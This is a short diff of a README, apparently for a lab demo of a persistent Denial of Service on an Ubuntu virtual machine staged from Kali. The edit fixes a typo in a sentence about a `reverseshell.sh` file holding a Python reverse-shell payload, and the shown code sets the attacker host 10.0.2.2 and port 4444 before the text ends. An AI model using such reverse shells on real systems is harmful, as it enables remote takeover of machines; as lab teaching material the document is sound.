@@ -9,7 +9,7 @@ The goal of the demo is to create a persistent Denial of Service on an Ubuntu vi
 
 ## Kali Preparation
 First of all, all the necessary files were created on Kali.
-First, the `reverseshell.sh` file, where the is the [payload](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) in python 
+First, the `reverseshell.sh` file, where the [payload](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) is in python 
 ```py
 export RHOST="10.0.2.2";
 export RPORT=4444;
